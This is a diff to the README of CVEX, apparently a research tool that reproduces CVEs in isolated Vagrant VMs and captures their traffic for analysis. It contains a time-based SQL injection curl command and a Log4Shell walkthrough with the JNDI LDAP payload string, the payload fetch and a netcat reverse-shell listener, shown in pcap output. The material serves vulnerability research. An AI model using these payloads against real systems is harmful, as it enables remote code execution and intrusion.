@@ -30,17 +30,18 @@ While in theory Vagrant should work with any VM provider, CVEX was tested only w
 
 ## Run
 
-Always execute CVEX from the root folder:
+Execute a CVE by providing the CVEX record folder to the `cvex` command:
 ```
-~/CVEX$ cvex -c CVE-0000-00001
+~/CVEX$ cvex -c records/CVE-0000-00001
 ```
 
-CVEX comes with a set of PoC CVEs:
+CVEX comes with a set of PoCs:
 - [CVE-0000-00000](records/CVE-0000-00000): curl, executed on Windows, downloads a web-page from ngix, running on Ubuntu
 
 <details>
 
-<summary>Execution of CVE-0000-00000</summary>
+<summary>**Execution of CVE-0000-00000**</summary>
+
 
 [records/CVE-0000-00000/cvex.yml](records/CVE-0000-00000/cvex.yml) describes the VM infrastructure for this PoC:
 ```
@@ -79,7 +80,7 @@ CVEX blueprints define minimal network deployments:
 - Ubuntu host attacking multiple Windows hosts
 - ...
 
-Contributors can provide additional blueprints. In the case of CVE-0000-00000 the blueprint `windows10-ubuntu2204` is stored in [/blueprint/windows10-ubuntu2204/blueprint.yml](/blueprint/windows10-ubuntu2204/blueprint.yml):
+Contributors can provide additional blueprints. In the case of CVE-0000-00000 the blueprint `windows10-ubuntu2204` is stored in [blueprints/windows10-ubuntu2204/blueprint.yml](blueprints/windows10-ubuntu2204/blueprint.yml):
 ```
 windows:
   image: "gusztavvargadr/windows-10"
@@ -106,16 +107,16 @@ Full list of parameters of a blueprint:
 ...
 ```
 
-At first, CVEX pulls the Ubuntu VM from the Vagrant repository and stores the config file of the VM in ~/.cvex/router. This Ubuntu VM will act as a router. It also creates the `clean` snapshot with the initial state of the VM:
+At first, CVEX pulls an Ubuntu VM from the Vagrant repository and stores the config file of the VM in `~/.cvex/router`. This VM will be the router. It also creates the `clean` snapshot with the initial state of the VM:
 ```
-~/CVEX$ cvex -c CVE-0000-00000
+~/CVEX$ cvex -c records/CVE-0000-00000
 2024-09-13 13:52:30,081 - INFO - [router] Retrieving status of router...
 2024-09-13 13:52:32,820 - INFO - [router] Initializing a new VM router at /home/john/.cvex/router...
 2024-09-13 13:52:33,766 - INFO - [router] Starting the VM router...
 2024-09-13 13:54:41,199 - INFO - [router] Creating snapshot 'clean' for VM router (192.168.56.2)...
 ```
 
-Ansible scripts from [ansible](/ansible) are used to pre-configure VMs. CVEX runs the [ansible/router.yml](/ansible/router.yml) Ansible playbook before creating the `router` snapshot:
+Ansible playbooks from [ansible](/ansible) are used to pre-configure VMs. CVEX runs the [ansible/router.yml](/ansible/router.yml) Ansible playbook before creating the `router` snapshot:
 ```
 2024-09-13 13:54:56,344 - INFO - [router] Executing Ansible playbook ansible/router.yml...
 2024-09-13 13:54:58,042 - INFO - [router] 
@@ -177,7 +178,7 @@ Sometimes VM initialization takes longer than expected:
 
 In this case we need to wait until the VM is up and the OS is aready. For example, use the VirtualBox GUI. As soon as the OS fully loads, re-run CVEX with `-k`. With this parameter CVEX uses the VMs that are already running:
 ```
-$ cvex -c CVE-0000-00000 -k
+$ cvex -c records/CVE-0000-00000 -k
 2024-09-13 14:25:18,880 - INFO - [router] Retrieving status of router...
 2024-09-13 14:25:23,828 - INFO - [router] VM router (192.168.56.2) is already running
 2024-09-13 14:25:26,910 - INFO - [router] Retrieving snapshot list of router...
@@ -188,7 +189,7 @@ $ cvex -c CVE-0000-00000 -k
 2024-09-13 14:25:51,738 - INFO - [windows] Creating snapshot 'clean' for VM windows (192.168.56.3)...
 ```
 
-CVEX runs the [ansible/windows.yml](/ansible/windows.yml) Ansible script before creating the `CVE-0000-00000/windows` snapshot:
+CVEX runs the [ansible/windows.yml](/ansible/windows.yml) Ansible playbook before creating the `CVE-0000-00000/windows` snapshot:
 ```
 2024-09-13 14:26:30,209 - INFO - [windows] Executing Ansible playbook ansible/windows.yml...
 2024-09-13 14:26:31,345 - INFO - [windows] 
@@ -300,14 +301,14 @@ Every VM may have maximum 3 Ansible playbooks:
 2. Blueprint playbook (none in our case) - controlled by CVEX blueprint contributors
 3. CVE playbook ([records/CVE-0000-00000/linux.yml](records/CVE-0000-00000/linux.yml)) - controlled by CVEX users
 
-At this point all the VMs (router, Windows, Ubuntu) are up and running, the needed software is installed and the needed VM snapshots are created. CVEX performs the following actions:
+At this point all VMs (router, Windows, Ubuntu) are up and running, the needed software is installed and the needed VM snapshots are created. CVEX performs the following actions:
 - Configures the hosts file on every VM except the router
 - Sets up static network interface IP addresses on every VM
 - Configures the routing so that all network traffic flows through the router VM
 - Runs tcpdump on the router
 - Runs mitmproxy on the router
-- Runs strace (on Linux)
-- Runs Process Monitor (on Windows)
+- Runs strace on Linux VMs
+- Runs Process Monitor on Windows VMs
 
 ```
 2024-09-13 14:43:04,575 - INFO - [router] Executing 'ls /etc/netplan'...
@@ -366,7 +367,7 @@ At this point all the VMs (router, Windows, Ubuntu) are up and running, the need
 ```
 
 
-At this point all VMs are ready to reproduce the CVE. CVEX executes the command from cvex.yml:
+At this point all VMs are ready to reproduce the CVE. CVEX executes the command from `cvex.yml`:
 ```
 2024-09-13 14:44:19,648 - INFO - [windows] Executing 'curl https://ubuntu/index.html?cat=(select*from(select(sleep(15)))a)'...
 ```
@@ -399,7 +400,7 @@ Parameter `-o` specifies custom output folder.
 - [CVE-2021-44228](records/CVE-2021-44228): Log4j vulnerability with backconnect to remote shell
 
 <details>
-<summary>Execution of CVE-2021-44228 and analysis of logs</summary>
+<summary>**CVE-2021-44228 logs analysis**</summary>
 
 [records/CVE-2021-44228/cvex.yml](records/CVE-2021-44228/cvex.yml) describes the VM infrastructure for this CVE:
 
@@ -420,14 +421,14 @@ ubuntu2:
 
 Ansible playbook `ubuntu1.yml` installs an Apache Tomcat based web application, vulnerable to the Log4j attack. Ansible playbook `ubuntu2.yml` installs a fake LDAP server and a web server that is hosting the payload.
 
-Section "Execution of CVE-0000-00000" describes the execution process in details, therefore we will omit it here. Instead, let's focus on analysis of logs produced by CVEX. In our logs the IP address of ubuntu1 is 192.168.56.3, the IP address of ubuntu2 is 192.168.56.4.
+Since the execution process has been already described in the section `Execution of CVE-0000-00000`, let's focus on analysis of logs produced by CVEX. In our logs the IP address of `ubuntu1` is `192.168.56.3`, the IP address of `ubuntu2` is `192.168.56.4`.
 
 To inspect the PCAP file, run tcpdump:
 ```
 ~/CVEX$ tcpdump -qns 0 -A -r out/router_raw.pcap
 ```
 
-The attacker 192.168.56.4 (ubuntu2) issues an HTTP POST request to Apache Tomcat running on 192.168.56.3 (ubuntu1). The POST request contains malicious data `${jndi:ldap://192.168.56.4:1389/a}` in the `uname` field. The data is URL-encoded:
+The attacker `192.168.56.4` (`ubuntu2`) issues an HTTP POST request to Apache Tomcat running on `192.168.56.3` (`ubuntu1`). The POST request contains malicious data `${jndi:ldap://192.168.56.4:1389/a}` in the `uname` field. The data is URL-encoded:
 ```
 15:34:03.050477 IP 192.168.56.4.36880 > 192.168.56.3.8080: tcp 219
 E....t@.@.....8...8.....:.u................
@@ -441,7 +442,7 @@ Content-Type: application/x-www-form-urlencoded
 uname=%24%7Bjndi%3Aldap%3A%2F%2F192.168.56.4%3A1389%2Fa%7D&password=
 ```
 
-Log4j logs the `${jndi:ldap://192.168.56.4:1389/a}` string. This triggers the JNDI manager to make a request to the LDAP server controlled by the attacker (192.168.56.4:1389). The LDAP server replies with a link to the payload:
+Log4j logs the `${jndi:ldap://192.168.56.4:1389/a}` string. This triggers the JNDI manager to make a request to the LDAP server controlled by the attacker (`192.168.56.4:1389`). The LDAP server replies with a link to the payload:
 ```
 15:34:04.187067 IP 192.168.56.4.1389 > 192.168.56.3.36182: tcp 148
 E.....@.@.d...8...8..m.V.:..Z3.I...........
@@ -455,7 +456,7 @@ E..B..@.@.em..8...8..m.V.:..Z3.I...........
 ......
 ```
 
-JNDI manager requests the payload hosted on http://192.168.56.4:9999/Exploit.class:
+JNDI manager requests the payload hosted on `http://192.168.56.4:9999/Exploit.class`:
 ```
 15:34:04.229544 IP 192.168.56.3.41350 > 192.168.56.4.9999: tcp 213
 E..	@.@.>.	...8...8...'...._96.............
@@ -468,7 +469,7 @@ Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
 Connection: keep-alive
 ```
 
-Web server 192.168.56.4:9999 replies with the payload:
+Web server `192.168.56.4:9999` replies with the payload:
 ```
 15:34:04.385348 IP 192.168.56.4.9999 > 192.168.56.3.41350: tcp 198
 E.....@.?..#..8...8.'...96.....4...........
@@ -511,7 +512,7 @@ SourceFile...Exploit.java........192.168.56.4.../bin/sh...java/lang/ProcessBuild
 .............&...1...8...?...F...T...\...d...q...y.................................!..."...$...%...&."...1....T....#..$...$..%..&..'..'..'..(..(......X..)..*...........+.....,
 ```
 
-The payload connects back to netcat ("nc -nvlp 1234" from cvex.yml), executed by the attacker:
+The payload connects back to netcat (`nc -nvlp 1234` from cvex.yml), executed by the attacker:
 ```
 15:34:04.462260 IP 192.168.56.3.60972 > 192.168.56.4.1234: tcp 0
 E..<I.@.?..Y..8...8..,...g........../A.........
@@ -531,7 +532,49 @@ E..<..@.?.Jd..8...8....,.Z...g......"..........
 
 ## Debug
 
-If something goes wrong and re-starting CVEX doesn't help, run it with the `-v` parameter. It will show you even more logs that may help debugging the issue.
+1. Re-start CVEX.
+2. Restart CVEX with the `-v` parameter (verbose logging).
+3. Connect to the VM via SSH with the help of `vagrant ssh` command:
+```
+$ cd ~/.cvex/bento_ubuntu-22.04/202404.23.0/1/
+
+~/.cvex/bento_ubuntu-22.04/202404.23.0/1$ vagrant snapshot restore CVE-2021-44228/ubuntu1
+==> default: Restoring the snapshot 'CVE-2021-44228/ubuntu1'...
+==> default: Checking if box 'bento/ubuntu-22.04' version '202404.23.0' is up to date...
+==> default: Resuming suspended VM...
+==> default: Booting VM...
+==> default: Waiting for machine to boot. This may take a few minutes...
+    default: SSH address: 127.0.0.1:2201
+    default: SSH username: vagrant
+    default: SSH auth method: private key
+==> default: Machine booted and ready!
+==> default: Machine already provisioned. Run `vagrant provision` or use the `--provision`
+==> default: flag to force provisioning. Provisioners marked to run always will still run.
+
+~/.cvex/bento_ubuntu-22.04/202404.23.0/1$ vagrant ssh
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+  System information as of Thu Oct 10 06:33:32 AM UTC 2024
+
+  System load:  1.0625             Users logged in:          0
+  Usage of /:   15.2% of 30.34GB   IPv4 address for docker0: 172.17.0.1
+  Memory usage: 22%                IPv4 address for eth0:    10.0.2.15
+  Swap usage:   0%                 IPv4 address for eth1:    192.168.56.4
+  Processes:    155
+
+
+This system is built by the Bento project by Chef Software
+More information can be found at https://github.com/chef/bento
+Last login: Wed Oct  9 13:29:41 2024 from 10.0.2.2
+
+vagrant@ubuntu:~$ 
+```
+
+Use VirtualBox GUI to manage VMs and snapshots.
 
 ## Managing VMs
 
